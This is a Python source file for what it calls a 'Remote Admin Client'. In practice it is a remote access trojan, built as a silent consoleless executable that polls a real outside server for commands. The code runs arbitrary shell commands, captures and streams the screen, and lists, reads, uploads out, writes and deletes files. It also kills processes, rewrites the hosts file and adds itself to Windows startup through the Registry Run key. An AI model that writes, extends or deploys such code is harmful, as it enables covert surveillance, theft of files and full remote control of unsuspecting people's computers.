"""
Remote Admin Client
-------------------
Connects to your Next.js admin dashboard.

Build as silent .exe:
    pip install pyinstaller pillow requests psutil pyqt5
    pyinstaller --onefile --noconsole main.py
"""

from __future__ import annotations

import base64
import json
import os
import platform
import socket
import subprocess
import sys
import threading
import time
import traceback
import uuid
from datetime import datetime
from io import BytesIO
from pathlib import Path
from typing import Dict, List, Optional, Tuple

import requests

try:
    from PIL import ImageGrab
except ImportError:
    ImageGrab = None

try:
    import psutil
    HAS_PSUTIL = True
except ImportError:
    HAS_PSUTIL = False

# PyQt5 for the message popup
try:
    from PyQt5.QtWidgets import (
        QApplication, QWidget, QVBoxLayout, QHBoxLayout,
        QLabel, QTextEdit, QLineEdit, QPushButton, QFrame, QSizePolicy
    )
    from PyQt5.QtCore import Qt, QTimer, pyqtSignal, QObject
    from PyQt5.QtGui import QFont, QColor, QPalette, QIcon
    HAS_PYQT = True
except ImportError:
    HAS_PYQT = False

if sys.platform == "win32":
    import winreg

# ═══════════════════════════════════════════════════════════════════════════
#  CONFIG  ── edit SERVER_URL before building
# ═══════════════════════════════════════════════════════════════════════════
SERVER_URL      = "https://getpassion.xyz"
HEARTBEAT_SECS  = 5
STREAM_SECS     = 0.3
JPEG_QUALITY    = 45
STARTUP_NAME    = "RemoteAdminClient"
# ═══════════════════════════════════════════════════════════════════════════

HEARTBEAT_URL = f"{SERVER_URL}/api/rat/heartbeat"
ACK_URL       = f"{SERVER_URL}/api/rat/commands/{{cmd_id}}/ack"

# ── Persistent HWID ──────────────────────────────────────────────────────────
def _hwid_path() -> Path:
    if sys.platform == "win32":
        base = Path(os.environ.get("APPDATA", str(Path.home())))
    else:
        base = Path.home() / ".config"
    base.mkdir(parents=True, exist_ok=True)
    return base / ".ra_hwid"

def get_hwid() -> str:
    p = _hwid_path()
    if p.exists():
        return p.read_text().strip()
    hwid = str(uuid.uuid4())
    p.write_text(hwid)
    return hwid

HOSTNAME = socket.gethostname()
USERNAME = os.environ.get("USERNAME") or os.environ.get("USER") or "unknown"
PLATFORM = platform.system()
HWID     = get_hwid()

# ── Screenshot ───────────────────────────────────────────────────────────────
def capture_screenshot() -> Optional[str]:
    """Returns raw base64 JPEG (no data URI prefix)."""
    try:
        if ImageGrab:
            img = ImageGrab.grab()
        else:
            import shutil, tempfile
            if not shutil.which("scrot"):
                return None
            tmp = tempfile.NamedTemporaryFile(suffix=".png", delete=False)
            tmp.close()
            subprocess.run(["scrot", tmp.name], check=True, timeout=5)
            from PIL import Image
            img = Image.open(tmp.name)
            os.unlink(tmp.name)
        buf = BytesIO()
        img.convert("RGB").save(buf, format="JPEG", quality=JPEG_QUALITY)
        return base64.b64encode(buf.getvalue()).decode()
    except Exception:
        return None

# ── Stream thread ────────────────────────────────────────────────────────────
_streaming     = False
_stream_thread = None
_session_ref   = None

def _stream_loop():
    global _streaming
    while _streaming:
        b64 = capture_screenshot()
        if b64 and _session_ref:
            try:
                _session_ref.post(
                    HEARTBEAT_URL,
                    json={
                        "hostname": HOSTNAME, "username": USERNAME,
                        "platform": PLATFORM, "hwid": HWID,
                        "stream_frame_b64": b64,
                    },
                    timeout=10,
                )
            except Exception:
                pass
        time.sleep(STREAM_SECS)

def start_stream():
    global _streaming, _stream_thread
    if _streaming:
        return
    _streaming = True
    _stream_thread = threading.Thread(target=_stream_loop, daemon=True)
    _stream_thread.start()

def stop_stream():
    global _streaming
    _streaming = False

# ── Startup (Windows registry) ────────────────────────────────────────────────
def _exe_path() -> str:
    return sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)

def startup_enable():
    if sys.platform != "win32":
        return
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, STARTUP_NAME, 0, winreg.REG_SZ, f'"{_exe_path()}"')
        winreg.CloseKey(key)
    except Exception:
        pass

def startup_disable():
    if sys.platform != "win32":
        return
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, STARTUP_NAME)
        winreg.CloseKey(key)
    except Exception:
        pass

# ── Blocked sites ─────────────────────────────────────────────────────────────
HOSTS_PATH = (
    r"C:\Windows\System32\drivers\etc\hosts"
    if sys.platform == "win32" else "/etc/hosts"
)
BLOCK_TAG = "# __ra_block__"
BLOCK_KEYWORDS = [
    "porn", "xxx", "sex", "nsfw", "hentai",
    "xvideos", "pornhub", "xnxx", "redtube", "onlyfans",
]
BROWSER_PROCS = [
    "chrome.exe", "firefox.exe", "msedge.exe", "opera.exe",
    "brave.exe", "iexplore.exe", "chrome", "firefox", "safari", "brave",
]
_current_blocked: List[str] = []

def _apply_hosts(domains: List[str]) -> None:
    try:
        with open(HOSTS_PATH, "r") as f:
            lines = f.readlines()
        lines = [l for l in lines if BLOCK_TAG not in l]
        for d in domains:
            lines.append(f"127.0.0.1 {d} {BLOCK_TAG}\n")
            lines.append(f"127.0.0.1 www.{d} {BLOCK_TAG}\n")
        with open(HOSTS_PATH, "w") as f:
            f.writelines(lines)
    except Exception:
        pass

def _keywords_in(domains: List[str]) -> bool:
    for d in domains:
        for kw in BLOCK_KEYWORDS:
            if kw in d.lower():
                return True
    return False

def _kill_browsers():
    if HAS_PSUTIL:
        for proc in psutil.process_iter(["name"]):
            try:
                if proc.info["name"] and proc.info["name"].lower() in [b.lower() for b in BROWSER_PROCS]:
                    proc.kill()
            except Exception:
                pass
    elif sys.platform == "win32":
        for b in ["chrome.exe", "firefox.exe", "msedge.exe", "opera.exe", "brave.exe"]:
            subprocess.run(["taskkill", "/F", "/IM", b], capture_output=True)

def sync_blocked(domains: List[str]) -> None:
    global _current_blocked
    if sorted(domains) == sorted(_current_blocked):
        return
    _apply_hosts(domains)
    new_domains = [d for d in domains if d not in _current_blocked]
    if _keywords_in(new_domains):
        _kill_browsers()
    _current_blocked = list(domains)

def add_blocked(domains: List[str]) -> None:
    merged = list(set(_current_blocked + domains))
    sync_blocked(merged)

def remove_blocked(domains: List[str]) -> None:
    remaining = [d for d in _current_blocked if d not in domains]
    sync_blocked(remaining)

# ── Process list ──────────────────────────────────────────────────────────────
def get_processes() -> List[Dict]:
    procs = []
    if HAS_PSUTIL:
        for p in psutil.process_iter(["pid", "name", "cpu_percent", "memory_info", "status"]):
            try:
                info = p.info
                mem  = info["memory_info"].rss if info.get("memory_info") else 0
                procs.append({
                    "pid":    info["pid"] or 0,
                    "name":   info["name"] or "",
                    "cpu":    round(float(info.get("cpu_percent") or 0.0), 1),
                    "mem":    mem,
                    "status": info.get("status") or "unknown",
                })
            except Exception:
                pass
    elif sys.platform == "win32":
        try:
            raw = subprocess.check_output(
                ["tasklist", "/FO", "CSV", "/NH"], timeout=10, text=True
            )
            for line in raw.strip().splitlines():
                parts = [x.strip('"') for x in line.split('","')]
                if len(parts) >= 5:
                    try:
                        mem_bytes = int(
                            parts[4].replace(",", "").replace("\xa0K", "")
                                    .replace(" K", "").strip()
                        ) * 1024
                    except Exception:
                        mem_bytes = 0
                    procs.append({
                        "pid":    int(parts[1]) if parts[1].isdigit() else 0,
                        "name":   parts[0],
                        "cpu":    0.0,
                        "mem":    mem_bytes,
                        "status": "running",
                    })
        except Exception:
            pass
    return procs[:500]

# ── File listing ──────────────────────────────────────────────────────────────
def list_files(path: str) -> Tuple[List[Dict], str]:
    try:
        p = Path(path)
        if not p.exists():
            return [], str(p)
        entries = []
        for item in sorted(p.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
            try:
                stat = item.stat()
                entries.append({
                    "name":     item.name,
                    "path":     str(item),
                    "is_dir":   item.is_dir(),
                    "size":     stat.st_size if item.is_file() else 0,
                    "modified": datetime.fromtimestamp(stat.st_mtime).strftime("%Y-%m-%d %H:%M"),
                })
            except Exception:
                pass
        return entries, str(p)
    except Exception as e:
        return [], str(e)

def read_text_file(path: str) -> str:
    """Read a text file, return its contents (up to 100KB)."""
    try:
        p = Path(path)
        if not p.is_file():
            return f"[error] Not a file: {path}"
        # Try to read as text with multiple encodings
        for enc in ("utf-8", "utf-16", "latin-1", "cp1252"):
            try:
                content = p.read_text(encoding=enc)
                if len(content) > 100_000:
                    content = content[:100_000] + "\n\n[... truncated at 100KB ...]"
                return content
            except (UnicodeDecodeError, UnicodeError):
                continue
        # Fallback: read bytes and repr
        raw = p.read_bytes()[:4096]
        return f"[binary file, first 4096 bytes as hex]\n{raw.hex()}"
    except Exception as e:
        return f"[error reading file] {e}"

# ── PyQt5 Message Popup ───────────────────────────────────────────────────────

# We use a global QApplication instance (created once, reused)
_qt_app: Optional[QApplication] = None
_qt_app_lock = threading.Lock()

def _ensure_qt_app():
    global _qt_app
    if _qt_app is None:
        _qt_app = QApplication.instance() or QApplication(sys.argv)
    return _qt_app


class MessageSignal(QObject):
    """Used to safely show popups from non-Qt threads."""
    show_popup = pyqtSignal(str)


_msg_signal: Optional[MessageSignal] = None


class MessagePopup(QWidget):
    """Black/red themed message popup with reply textbox."""

    STYLE = """
        QWidget {
            background-color: #0d0a0b;
            color: #e5e3e4;
            font-family: 'Segoe UI', sans-serif;
        }
        QLabel#title {
            color: #dc2626;
            font-size: 15px;
            font-weight: bold;
            letter-spacing: 1px;
        }
        QLabel#subtitle {
            color: #5d585c;
            font-size: 11px;
        }
        QTextEdit#message_body {
            background-color: #140f10;
            border: 1px solid #2e292b;
            border-radius: 8px;
            color: #c5c0c2;
            font-size: 13px;
            padding: 10px;
        }
        QLineEdit#reply_input {
            background-color: #0f0b0c;
            border: 1px solid #2e292b;
            border-radius: 8px;
            color: #c5c0c2;
            font-size: 13px;
            padding: 8px 12px;
            height: 36px;
        }
        QLineEdit#reply_input:focus {
            border: 1px solid #dc262566;
        }
        QPushButton#send_btn {
            background-color: #dc262520;
            border: 1px solid #dc262544;
            border-radius: 8px;
            color: #dc2626;
            font-size: 12px;
            font-weight: bold;
            padding: 8px 20px;
            min-width: 80px;
        }
        QPushButton#send_btn:hover {
            background-color: #dc262540;
            border-color: #dc2626;
            color: #ff4444;
        }
        QPushButton#send_btn:pressed {
            background-color: #dc262660;
        }
        QPushButton#close_btn {
            background-color: #1c1418;
            border: 1px solid #2e292b;
            border-radius: 8px;
            color: #5d585c;
            font-size: 12px;
            padding: 8px 20px;
            min-width: 80px;
        }
        QPushButton#close_btn:hover {
            background-color: #231820;
            border-color: #4e4447;
            color: #e5e3e4;
        }
        QFrame#divider {
            color: #2e292b;
        }
    """

    def __init__(self, message: str, reply_callback, parent=None):
        super().__init__(parent)
        self.reply_callback = reply_callback
        self._setup_ui(message)

    def _setup_ui(self, message: str):
        self.setStyleSheet(self.STYLE)
        self.setWindowTitle("Message")
        self.setWindowFlags(
            Qt.WindowStaysOnTopHint |
            Qt.FramelessWindowHint |
            Qt.Window
        )
        self.setAttribute(Qt.WA_TranslucentBackground, False)
        self.setMinimumWidth(420)
        self.setMaximumWidth(560)

        # Drop shadow / border via outer frame
        outer = QVBoxLayout(self)
        outer.setContentsMargins(0, 0, 0, 0)
        outer.setSpacing(0)

        # Main container
        container = QWidget()
        container.setObjectName("container")
        container.setStyleSheet("""
            QWidget#container {
                background-color: #0d0a0b;
                border: 1px solid #2e292b;
                border-radius: 12px;
            }
        """)
        outer.addWidget(container)

        layout = QVBoxLayout(container)
        layout.setContentsMargins(20, 20, 20, 20)
        layout.setSpacing(12)

        # Title bar row
        title_row = QHBoxLayout()
        title_row.setSpacing(8)

        # Red accent bar
        accent = QFrame()
        accent.setFixedSize(3, 20)
        accent.setStyleSheet("background-color: #dc2626; border-radius: 2px;")
        title_row.addWidget(accent)

        title = QLabel("INCOMING MESSAGE")
        title.setObjectName("title")
        title_row.addWidget(title)
        title_row.addStretch()

        layout.addLayout(title_row)

        # Divider
        div = QFrame()
        div.setObjectName("divider")
        div.setFrameShape(QFrame.HLine)
        div.setFixedHeight(1)
        div.setStyleSheet("background-color: #1e191b; border: none;")
        layout.addWidget(div)

        # Message body (read-only)
        msg_area = QTextEdit()
        msg_area.setObjectName("message_body")
        msg_area.setPlainText(message)
        msg_area.setReadOnly(True)
        msg_area.setMaximumHeight(180)
        msg_area.setMinimumHeight(60)
        # Auto-resize to content
        doc_height = int(msg_area.document().size().height()) + 24
        msg_area.setFixedHeight(min(max(doc_height, 60), 180))
        layout.addWidget(msg_area)

        # Reply label
        reply_label = QLabel("Reply")
        reply_label.setObjectName("subtitle")
        reply_label.setStyleSheet("color: #5d585c; font-size: 11px; margin-top: 4px;")
        layout.addWidget(reply_label)

        # Reply input
        self.reply_input = QLineEdit()
        self.reply_input.setObjectName("reply_input")
        self.reply_input.setPlaceholderText("Type a reply… (Enter to send)")
        self.reply_input.returnPressed.connect(self._send)
        layout.addWidget(self.reply_input)

        # Buttons row
        btn_row = QHBoxLayout()
        btn_row.setSpacing(8)
        btn_row.addStretch()

        close_btn = QPushButton("Dismiss")
        close_btn.setObjectName("close_btn")
        close_btn.clicked.connect(self.close)
        btn_row.addWidget(close_btn)

        send_btn = QPushButton("Send Reply")
        send_btn.setObjectName("send_btn")
        send_btn.clicked.connect(self._send)
        btn_row.addWidget(send_btn)

        layout.addLayout(btn_row)

        self.adjustSize()

        # Center on screen
        if QApplication.instance():
            screen = QApplication.instance().primaryScreen()
            if screen:
                sg = screen.availableGeometry()
                self.move(
                    sg.center().x() - self.width() // 2,
                    sg.center().y() - self.height() // 2,
                )

    def _send(self):
        text = self.reply_input.text().strip()
        if text and self.reply_callback:
            self.reply_callback(text)
        self.close()

    # Allow dragging the frameless window
    def mousePressEvent(self, event):
        if event.button() == Qt.LeftButton:
            self._drag_pos = event.globalPos() - self.frameGeometry().topLeft()
            event.accept()

    def mouseMoveEvent(self, event):
        if event.buttons() == Qt.LeftButton and hasattr(self, '_drag_pos'):
            self.move(event.globalPos() - self._drag_pos)
            event.accept()


# Global: one popup at a time, pending replies queue
_active_popup: Optional[MessagePopup] = None
_reply_queue: List[str] = []
_reply_lock = threading.Lock()


def _show_message_popup(message: str, reply_callback):
    """Must be called from the Qt main thread."""
    global _active_popup
    if _active_popup is not None:
        try:
            _active_popup.close()
        except Exception:
            pass
    _active_popup = MessagePopup(message, reply_callback)
    _active_popup.show()
    _active_popup.raise_()
    _active_popup.activateWindow()


def show_message_qt(message: str, reply_callback):
    """
    Show a message popup. Safe to call from any thread.
    Runs the Qt event loop in a dedicated thread if needed.
    """
    if not HAS_PYQT:
        # Fallback: Windows MessageBox (no reply)
        if sys.platform == "win32":
            try:
                import ctypes
                ctypes.windll.user32.MessageBoxW(0, message, "Message", 0x40)
            except Exception:
                pass
        return

    def _run_popup():
        app = QApplication.instance() or QApplication(sys.argv)
        popup = MessagePopup(message, reply_callback)
        popup.show()
        app.exec_()  # blocks until popup is closed

    t = threading.Thread(target=_run_popup, daemon=True)
    t.start()


# ── Command handler ───────────────────────────────────────────────────────────
_pending_replies: List[str] = []
_replies_lock = threading.Lock()


def _queue_reply(text: str):
    with _replies_lock:
        _pending_replies.append(text)


def handle_command(cmd: Dict) -> Dict:
    ctype   = cmd.get("type", "")
    payload = cmd.get("payload") or {}
    result  = {}

    if ctype == "screenshot":
        b64 = capture_screenshot()
        if b64:
            result["screenshot_b64"] = b64

    elif ctype == "stream_start":
        start_stream()

    elif ctype == "stream_stop":
        stop_stream()

    elif ctype == "shell":
        command = payload.get("command", "")
        try:
            out = subprocess.check_output(
                command, shell=True, stderr=subprocess.STDOUT, timeout=30, text=True
            )
        except subprocess.CalledProcessError as e:
            out = e.output or ""
        except Exception as e:
            out = str(e)
        result["message_reply"] = out[:8000]

    elif ctype == "message":
        body = payload.get("body") or payload.get("text", "")
        if body:
            def on_reply(text: str):
                _queue_reply(text)
            show_message_qt(body, on_reply)
        # Don't set message_reply here — replies come back via _pending_replies

    elif ctype == "file_list":
        path = payload.get("path") or str(Path.home())
        entries, cwd = list_files(path)
        result["files_json"] = json.dumps(entries)
        result["file_cwd"]   = cwd

    elif ctype == "file_read":
        # Dashboard sends this when user clicks a text file
        file_path = payload.get("path", "")
        content = read_text_file(file_path)
        result["message_reply"] = f"[file_read: {file_path}]\n\n{content}"

    elif ctype == "file_download":
        file_path = payload.get("path", "")
        try:
            data = Path(file_path).read_bytes()
            result["file_upload_b64"]  = base64.b64encode(data).decode()
            result["file_upload_path"] = file_path
        except Exception as e:
            result["message_reply"] = f"[file_download error] {e}"

    elif ctype == "file_upload":
        b64      = payload.get("data_b64", "")
        dest_dir = payload.get("path") or str(Path.home())
        name     = payload.get("name", "upload")
        dest     = str(Path(dest_dir) / name)
        try:
            Path(dest).write_bytes(base64.b64decode(b64))
            result["message_reply"] = f"[file_upload] saved to {dest}"
        except Exception as e:
            result["message_reply"] = f"[file_upload error] {e}"

    elif ctype == "file_delete":
        file_path = payload.get("path", "")
        try:
            p = Path(file_path)
            if p.is_dir():
                import shutil
                shutil.rmtree(p)
            else:
                p.unlink()
            result["message_reply"] = f"[file_delete] deleted {file_path}"
        except Exception as e:
            result["message_reply"] = f"[file_delete error] {e}"

    elif ctype == "process_list":
        result["processes_json"] = json.dumps(get_processes())

    elif ctype == "process_kill":
        pid = payload.get("pid")
        try:
            if HAS_PSUTIL:
                psutil.Process(int(pid)).kill()
            elif sys.platform == "win32":
                subprocess.run(["taskkill", "/PID", str(pid), "/F"], timeout=5)
            else:
                os.kill(int(pid), 9)
            result["message_reply"] = f"[process_kill] PID {pid} terminated"
        except Exception as e:
            result["message_reply"] = f"[process_kill error] {e}"

    elif ctype == "block_sites":
        domains = payload.get("domains", [])
        add_blocked(domains)

    elif ctype == "unblock_sites":
        domains = payload.get("domains", [])
        remove_blocked(domains)

    elif ctype == "startup_enable":
        startup_enable()
        result["message_reply"] = "[startup] enabled"

    elif ctype == "startup_disable":
        startup_disable()
        result["message_reply"] = "[startup] disabled"

    return result


def ack_command(session: requests.Session, cmd_id: int):
    """Mark a command as acknowledged so it doesn't re-fire."""
    try:
        session.post(
            ACK_URL.format(cmd_id=cmd_id),
            headers={"x-rat-secret": os.environ.get("RAT_SECRET", "")},
            timeout=10,
        )
    except Exception:
        pass


# ── Main heartbeat loop ───────────────────────────────────────────────────────
def run():
    global _session_ref
    session = requests.Session()
    session.headers.update({"Content-Type": "application/json"})
    _session_ref = session

    while True:
        try:
            resp = session.post(
                HEARTBEAT_URL,
                json={
                    "hostname": HOSTNAME,
                    "username": USERNAME,
                    "platform": PLATFORM,
                    "hwid":     HWID,
                },
                timeout=15,
            )

            if resp.ok:
                data = resp.json()

                # Sync blocked sites from server state
                sync_blocked(data.get("blocked_sites", []))

                # Handle each pending command
                for cmd in data.get("commands", []):
                    cmd_id = cmd.get("id")
                    try:
                        extra = handle_command(cmd)
                    except Exception:
                        extra = {"message_reply": traceback.format_exc()[:2000]}

                    # ACK the command FIRST so it never fires again
                    if cmd_id:
                        ack_command(session, cmd_id)

                    # Send back any result data
                    if extra:
                        try:
                            session.post(
                                HEARTBEAT_URL,
                                json={
                                    "hostname": HOSTNAME,
                                    "username": USERNAME,
                                    "platform": PLATFORM,
                                    "hwid":     HWID,
                                    **extra,
                                },
                                timeout=15,
                            )
                        except Exception:
                            pass

                # Flush any queued replies (from message popup)
                with _replies_lock:
                    pending = list(_pending_replies)
                    _pending_replies.clear()

                for reply_text in pending:
                    try:
                        session.post(
                            HEARTBEAT_URL,
                            json={
                                "hostname":      HOSTNAME,
                                "username":      USERNAME,
                                "platform":      PLATFORM,
                                "hwid":          HWID,
                                "message_reply": reply_text,
                            },
                            timeout=15,
                        )
                    except Exception:
                        pass

        except requests.exceptions.ConnectionError:
            pass
        except Exception:
            pass

        time.sleep(HEARTBEAT_SECS)


if __name__ == "__main__":
    run()